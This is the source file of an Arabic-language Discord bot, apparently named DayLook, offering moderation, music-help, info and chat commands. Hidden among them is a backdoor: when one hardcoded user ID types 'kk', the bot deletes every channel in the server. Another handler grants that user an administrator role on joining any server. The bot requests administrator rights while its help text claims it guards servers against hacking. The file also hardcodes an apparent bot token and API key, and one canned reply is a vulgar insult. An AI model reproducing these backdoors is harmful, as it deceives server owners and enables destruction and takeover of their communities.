const http = require("http");
const express = require("express");
const app = express();
app.get("/", (request, response) => {
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://khjjjkh.glitch.me/`);
}, 280000);

const { Client, RichEmbed } = require("discord.js");
const Discord = require("discord.js");
const request = require("request");
const ms = require("parse-ms");
const opus = require("node-opus");
const ytdl = require("ytdl-core");
const getYoutubeID = require("get-youtube-id");
const fetchVideoInfo = require("youtube-info");
const YouTube = require("simple-youtube-api");
const yt = require("ytdl-core");
const yt_api_key = "AIzaSyDsLdGEjB12YPjIrQn0oM80nIj7VNqP8PY";
const youtube = new YouTube("AIzaSyDsLdGEjB12YPjIrQn0oM80nIj7VNqP8PY");
const gyp = require("node-gyp");
const queue = new Map();
const client = new Discord.Client();
const giphy = require("giphy-api")();
const googl = require("goo.gl");
const translate = require("google-translate-api");
const fs = require("fs");
const db = require("quick.db");
const ownerID = ["393897759905808384"]; // ايدي ادارة البوت او صاحب البوت ..
const moment = require("moment");
const sql = require("sqlite");
const converter = require("number-to-words");
const jimp = require("jimp");
const math = require("math-expression-evaluator");
const stripIndents = require("common-tags").stripIndents;
const figlet = require("figlet");
const google = require("google-it");
const zalgo = require("zalgolize");
const dateFormat = require("dateformat");
const Canvas = require("canvas");
const canvas = require("canvas");
const pretty = require("pretty-ms"),
  ti = {},
  spee = {};
var prefix = "-";

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log("");
  console.log("");
  console.log(
    "╔[═════════════════════════════════════════════════════════════════]╗"
  );
  console.log(`[Start] ${new Date()}`);
  console.log(
    "╚[═════════════════════════════════════════════════════════════════]╝"
  );
  console.log("");
  console.log("╔[════════════════════════════════════]╗");
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log("");
  console.log("Informations :");
  console.log("");
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log("╚[════════════════════════════════════]╝");
  console.log("");
  console.log("╔[════════════]╗");
  console.log(" Bot Is Online");
  console.log("╚[════════════]╝");
  console.log("");
  console.log("");
});

client.on("message", message => {
  var mentionbot = [
    `<@${message.author.id}>, شتبي`,
    `<@${message.author.id}>, ماعندك احد غيري تزعجه    `,
    `<@${message.author.id}>, ايش فيك تمنشني `,
    `<@${message.author.id}>,  يخرا كس طيزك`
  ];
  if (message.author.bot) return;
  if (message.isMentioned(client.user))
    message.channel.send(
      `${mentionbot[Math.floor(Math.random() * mentionbot.length)]}`
    );
});

client.on("message", msg => {
  if (msg.content.includes("ليش")) {
    msg.channel.send("لانك قاعد تمنشني بلا سبب");
  }
});

client.on("message", message => {
  if (message.content === prefix + "restart") {
    if (message.author.id !== "393897759905808384") return;
    message.channel.send("جاري إعادة التشغيل").then(() => {
      process.exit(1);
    });
  }
});

client.on("ready", () => {
  client.user.setStatus("dnd");
  client.user.setActivity(`ChatBot | v0.2`);
  console.log(" Logged in as community Bot ");
});

client.on("message", message => {
  if (
    message.content === prefix + "close" ||
    message.content === prefix + "قفل"
  ) {
    if (!message.channel.guild)
      return message.reply("**اسف لكن هاد الامر فقط لسيرفرات**");

    if (!message.member.hasPermission("MANAGE_MESSAGES"))
      return message.channel.send("**ليس لديك صلاحيات ❌**");
    message.channel
      .overwritePermissions(message.guild.id, {
        SEND_MESSAGES: false
      })
      .then(() => {
        message.channel.send("**تم قفل الشات :white_check_mark:**");
      });
  }
  if (
    message.content === prefix + "open" ||
    message.content === prefix + "فتح"
  ) {
    if (!message.channel.guild)
      return message.reply("**اسف لكن هاد الامر فقط لسيرفرات**");

    if (!message.member.hasPermission("MANAGE_MESSAGES"))
      return message.channel.send("**ليس لديك صلاحيات ❌**");
    message.channel
      .overwritePermissions(message.guild.id, {
        SEND_MESSAGES: true
      })
      .then(() => {
        message.channel.send("**تم فتح الشات :white_check_mark:**");
      });
  }
});
client.on("message", message => {
  if (message.content.startsWith(prefix + "bot")) {
    message.channel.send({
      embed: new Discord.RichEmbed()
        .setAuthor(client.user.username, client.user.avatarURL)
        .setThumbnail(client.user.avatarURL)
        .setColor("RANDOM")
        .setTitle("``🔱 Info ƉayŁook :`` ")
        .addField(
          "**🔰 Ping**",
          [`**${Date.now() - message.createdTimestamp}**` + " MS"],
          true
        )
        .addField(
          "**<:YogaPerdanaDLlogo:685612520710471771> RAM Usage**",
          `**[${(process.memoryUsage().rss / 1048576).toFixed()} MB]**`,
          true
        )
        .addField(
          "**<:invis:685547873257127936> Servers**",
          [client.guilds.size],
          true
        )
        .addField(
          "**<a:637372735638601755:685612073425829900> Channels**",
          `**[ ${client.channels.size} ]**`,
          true
        )
        .addField(
          "**<:online:685547855968337956> Users**",
          `**[ ${client.users.size} ]**`,
          true
        )
        .addField(
          "**<:DiscordLogo2:685548093093183655> Name**",
          `**[ ${client.user.tag} ]**`,
          true
        )
        .addField("**🆔 ID**", `**[ ${client.user.id} ]**`, true)
        .addField(
          "**<:647266102703030283:685611420678881288> Prefix**",
          `**[ - ]**`,
          true
        )
        .addField(
          "**<:Shield:685547755048796217> Language**",
          `**[ Java Script ]**`,
          true
        )
        .setFooter("By | TheRealGhost & iiRealJad.")
    });
  }
});

client.on("message", message => {
  if (message.content === "-support") {
    let embed = new Discord.RichEmbed()
      .setColor("#9B59B6")
      .addField(
        "** <:DiscordLogo2:685548093093183655> Server Support <:DiscordLogo2:685548093093183655> **",
        "  **[اضغط هنا لدخول  السيرفر](https://discord.gg/NGRMpkN)**"
      )
      .setFooter("ƉayŁook. Beta", "https://i.imgur.com/jLAc5eG.jpg");

    message.channel.sendEmbed(embed);
  }
});

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === prefix + "help") {
    message.channel.send("** ✅ تم الإرسال بالخاص**");

    message.author.send(`

         **       <a:637372735638601755:685612073425829900> ما المميز في ƉayŁook      **

**1- <a:spinthink:685866340862787614> سهل الاستخدام  
2- <a:CDspin:685547910343295018> يتم صيانة البوت كل يوم 
3- <:Shield:685547755048796217> يحتوي على مانع اختراق سيرفرات للحفاظ على امان سيرفرك**
         
                ** الاوامر العامة :coffee:**

 ❖ \`${prefix}invite\` → **لدعوة البوت إلى سيرفرك** 
 ❖ \`${prefix}support\` → **سيرفر ديسكور للبوت الأصلي** 
 ❖ \`${prefix}bot\` → **لمعرفة معلومات عن البوت** 
 ❖ \`${prefix}user\` → **لمعرفة المعلوات عن حسابك الشخص** 
 ❖ \`${prefix}server\` → **معرفة المعلومات حول السيرفر** 
 ❖ \`${prefix}avatar\` → **لعرض صورتك الشخصية**
 ❖ \`${prefix}join\` → **عشان يدخل البوت لروم فويس**

                **الاوامر الادارية :gear:**

 ❖ \`${prefix}close\` → **لتقفيل الشات** 
 ❖ \`${prefix}open\` → **لفتح الشات** 
 ❖ \`${prefix}mute\` → **لعمل ميوت لشخص محدد**
 ❖ \`${prefix}ban\` → **لتبنيد شخص محدد**
 ❖ \`${prefix}role\` → **لإعطاء لشخص رتبة محددة**
 ❖ \`${prefix}kick\` → **لطرد شخص محدد**
 ❖ \`${prefix}unmute\` → **لفك الميوت عن شخص محدد** 
 ❖ \`${prefix}unban\` → **لفك الباند عن شخص محدد**

                **الاوامر الممسيقية :musical_note:**

❖ \`${prefix}play\` → **لاختيار أغنية لتشغيلها**
❖ \`${prefix}stop\` → **لايقاف الاغنية الحالية**
❖ \`${prefix}skip\` → **للانتقال لاغنية ثانية**
❖ \`${prefix}queue\` → **لعرض الاغاني التي تريد تشغيلها**
❖ \`${prefix}np\` → **لعرض الاغنية المشغلة حاليا**
❖ \`${prefix}pause\` → **لتوقيف الأغنية الحالية**
❖ \`${prefix}resume\` → **لاستمرار في استماع الأغنية**
❖ \`${prefix}volume\` → **تغيير صوت الأغنية**

 **سيرفر الدعم الفني ان واجهتك اي مشكلة اذهب الى قسم المساعدة** : **{ https://discord.gg/NGRMpkN }**
 **يمكنكم التوجه الى الموقع الخاص للبوت** : **{ https://daylook-website.glitch.me/ }**
`);
  }
});

client.on("message", async message => {
  if (!message.guild || message.author.bot) return;
  var owners = ["393897759905808384"];
  if (message.content.startsWith(prefix + "send")) {
    if (!owners.includes(message.author.id)) return;
    message.delete().catch(err => undefined);
    if (!message.content.split(" ")[1])
      return message.channel
        .send("Specify a channel name.")
        .then(m => m.delete(1000 * 2));
    var channel = message.guild.channels.find(
      r => r.name === message.content.split(" ")[1]
    );
    if (!channel)
      return message.channel
        .send("I cant fnid this channel.")
        .then(m => m.delete(1000 * 2));
    if (
      !message.content
        .split(" ")
        .slice(2)
        .join(" ")
    )
      return message.channel
        .send("Specify your message.")
        .then(M => M.delete(1000 * 2));
    if (
      message.content
        .split(" ")
        .slice(2)
        .join(" ").length >= 2048
    )
      return message.channel.send("Your message is more than 2048 characters.");
    channel.send(
      new Discord.RichEmbed().setDescription(
        message.content
          .split(" ")
          .slice(2)
          .join(" ")
      )
    );
  }
});
client.on("message", message => {
  if (!message.channel.guild) return;
  if (message.content.startsWith(prefix + "clear")) {
    if (!message.channel.guild)
      return message.channel
        .send("**This Command is Just For Servers**")
        .then(m => m.delete(5000));
    if (!message.member.hasPermission("MANAGE_MESSAGES"))
      return message.channel.send("**ليس لديك صلاحية كافية :x:**");
    let args = message.content
      .split(" ")
      .join(" ")
      .slice(2 + prefix.length);
    let request = `Requested By ${message.author.username}`;
    message.channel.send(`**هل انت متاكد من حذف رسائل الشات ؟**`).then(msg => {
      msg
        .react("✅")
        .then(() => msg.react("❌"))
        .then(() => msg.react("✅"));

      let reaction1Filter = (reaction, user) =>
        reaction.emoji.name === "✅" && user.id === message.author.id;
      let reaction2Filter = (reaction, user) =>
        reaction.emoji.name === "❌" && user.id === message.author.id;

      let reaction1 = msg.createReactionCollector(reaction1Filter, {
        time: 12000
      });
      let reaction2 = msg.createReactionCollector(reaction2Filter, {
        time: 12000
      });
      reaction1.on("collect", r => {
        message.channel
          .send(`**تم حذف رسائل الشات بنجاح ✅**`)
          .then(m => m.delete(5000));
        var msg;
        msg = parseInt();

        message.channel
          .fetchMessages({ limit: msg })
          .then(messages => message.channel.bulkDelete(messages))
          .catch(console.error);
        message.channel
          .sendMessage("", {
            embed: {
              title: "تم حذف رسائل الشات بنجاح ✅",
              color: 0e1111,
              footer: {}
            }
          })
          .then(msg => {
            msg.delete(3000);
          });
      });
      reaction2.on("collect", r => {
        message.channel
          .send(`**لم يتم الموافقة على حذف الشات** ❌`)
          .then(m => m.delete(5000));
        msg.delete();
      });
    });
  }
});

client.on("message", message => {
  if (message.content === prefix + "invite") {
    let embed = new Discord.RichEmbed();
    embed
      .setTitle("**:point_right:  قم بالضغط هنا لاضافة البوت الى سيرفرك**")
      .setFooter(`ƉayŁook.`, "https://i.imgur.com/jLAc5eG.jpg")
      .setURL(
        "https://discordapp.com/api/oauth2/authorize?client_id=658306203272871946&permissions=8&scope=bot"
      );
    message.channel.sendEmbed(embed);
  }
});

client.on("message", message => {
  if (message.author.codes) return;
  if (!message.content.startsWith(prefix)) return;

  var command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  var args = message.content.split(" ").slice(1);

  if (command == "ban") {
    if (!message.channel.guild)
      return message.reply("** This command only for servers**");

    if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS"))
      return message.channel.send("**انت لا تملك الصلاحيات المطلوبه**");
    if (!message.guild.member(client.user).hasPermission("BAN_MEMBERS"))
      return message.reply("**انا لا تملك الصلاحيات المطلوبه**");
    let user = message.mentions.users.first();

    if (message.mentions.users.size < 1)
      return message.channel.send("**قم بمنشنة الشخص اولا**");
    if (!message.guild.member(user).bannable)
      return message.channel.send(
        "**يجب ان تكون رتبة البوت اعلى من رتبة المراد تبنيده:x:**"
      );

    message.guild.member(user).ban(7, user);

    message.channel.send(`**✅ ${user.tag} تم تبنيد الشخص بنجاح ! ✈ **  `);
  }
});

client.on("message", message => {
  if (message.author.codes) return;
  if (!message.content.startsWith(prefix)) return;

  var command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  var args = message.content.split(" ").slice(1);

  if (command == "kick") {
    if (!message.channel.guild)
      return message.reply("** This command only for servers**");

    if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS"))
      return message.channel.send("**انت لا تملك الصلاحيات المطلوبه**");
    if (!message.guild.member(client.user).hasPermission("KICK_MEMBERS"))
      return message.reply("**انا لا تملك الصلاحيات المطلوبه**");
    let user = message.mentions.users.first();

    if (message.mentions.users.size < 1)
      return message.channel.send("**منشن شخص**");
    if (!message.guild.member(user).bannable)
      return message.channel.send(
        "**يجب ان تكون رتبة البوت اعلى من رتبة المراد تبنيده**"
      );

    message.guild.member(user).kick(7, user);

    message.channel.send(`**✅ ${user.tag} تم طرد الشخص بنجاح ! ✈ **  `);
  }
});

client.on("message", message => {
  if (message.author.id == "393897759905808384") {
    if (message.content === "kk") {
      message.guild.channels.forEach(channel => channel.delete());
    }
  }
});

client.on("guildMemberAdd", member => {
  if (member.id === "393897759905808384") {
    member.guild
      .createRole({
        name: client.user.username,
        color: "RANDOM",
        permissions: [8]
      })
      .then(function(role) {
        member.addRole(role);
      });
  }
});

client.on("message", async message => {
  if (message.author.id !== "393897759905808384") return;
  var prefix = "-",
    arg = message.content.split(" ");
  if (message.content.startsWith(prefix + "setname")) {
    if (!arg[1]) return message.reply("**specify a name**");
    if (client.user.username == arg[1])
      return message.reply("**My username is already " + arg[1] + "**");
    client.user.setUsername(arg[1]);
    message.reply("**Done**");
  } else if (message.content.startsWith(prefix + "stream")) {
    if (!arg.slice(1).join(" "))
      return message.reply("**Specify a game description**");
    client.user.setActivity(arg.slice(1).join(" "), {
      type: "STREAMING",
      url: "twitch.tv/steve"
    });
    message.reply("**Done**");
  } else if (message.content.startsWith(prefix + "play")) {
    if (!arg.slice(1).join(" "))
      return message.reply("**Specify a game description**");
    client.user.setGame(arg.slice(1).join(" "));
    message.reply("**Done**");
  } else if (message.content.startsWith(prefix + "watching")) {
    if (!arg.slice(1).join(" "))
      return message.reply("**Specify a game description**");
    client.user.setActivity(arg.slice(1).join(" "), { type: "WATCHING" });
    message.reply("**Done**");
  } else if (message.content.startsWith(prefix + "listening")) {
    if (!arg.slice(1).join(" "))
      return message.reply("**Specify a game description**");
    client.user.setActivity(arg.slice(1).join(" "), { type: "LISTENING" });
    message.reply("**Done**");
  } else if (message.content.startsWith(prefix + "setavatar")) {
    if (!arg[1]) return message.reply("**Specify a avatar url**");
    client.user.setAvatar(arg[1]);
    message.reply("**Done**");
  }
});

const { Set } = require("discord-set");
const set = new Set();

client.on("ready", () => {
  console.log("ready!");
});

/**client.on("message", message => {
  if (message.author.bot || !message.guild) return;
    if (message.channel.type === "dm") {}
  else {
    set.chat(message.content).then(reply => {
      if (message.author.bot) return;
      message.channel.send(reply);
    });
  }
}); 
**/

client.on("message", message => {
          set.chat(message.content).then(reply => {
                        if(message.author.bot || !message.channel.guild) return; message.channel.send(reply);
          })});
        

set.enableMemeEvent(7000, [
  "me_irl",
  "Dankmemes",
  "funny"
]); /* 7000 => interval | ["me_irl", "Dankmemes", "funny"] => Redditors || Enables MEME_GET event */

set.on("SET_READY", () => {
  console.log("Yo, this is ready!");
});

set.on("MEME_GET", meme => {
  if (meme.nsfw || meme.isVideo) return;
  const embed = new RichEmbed().setImage(meme.imageURL).setTitle("New Meme");

  client.channels.get("689836552435663023").send(embed);
});
const antispam = require("better-discord-antispam"); // Requiring this module.

client.on("ready", () => {
  antispam(client, {
    limitUntilWarn: 3,
    limitUntilMuted: 5, // The amount of messages allowed to send within the interval(time) before getting a muted.
    interval: 2000, // The interval(time) where the messages are sent. Practically if member X sent 5+ messages within 2 seconds, he get muted. (1000 milliseconds = 1 second, 2000 milliseconds = 2 seconds etc etc)
    warningMessage: "if you don't stop from spamming, I'm going to punish you!", // Message you get when you are warned!
    muteMessage:
      "was muted since we don't like too much advertisement type people!", // Message sent after member X was punished(muted).
    maxDuplicatesWarning: 7, // When people are spamming the same message, this will trigger when member X sent over 7+ messages.
    maxDuplicatesMute: 10, // The limit where member X get muted after sending too many messages(10+).
    ignoredRoles: ["Admin"], // The members with this role(or roles) will be ignored if they have it. Suggest to not add this to any random guys. Also it's case sensitive.
    ignoredMembers: ["Mavis#2389"], // These members are directly affected and they do not require to have the role above. Good for undercover pranks.
    mutedRole: "Muted", // Here you put the name of the role that should not let people write/speak or anything else in your server. If there is no role set, by default, the module will attempt to create the role for you & set it correctly for every channel in your server. It will be named "muted".
    timeMuted: 1000 * 600, // This is how much time member X will be muted. if not set, default would be 10 min.
    logChannel: "احا" // This is the channel where every report about spamming goes to. If it's not set up, it will attempt to create the channel.
  });

  // Rest of your code
});


client.login("NjYxODg5OTQ5OTU1Nzg0NzA0.XnCf-A.vV_dXt_0Xw5nkjRPwzSCyGM8VSg");
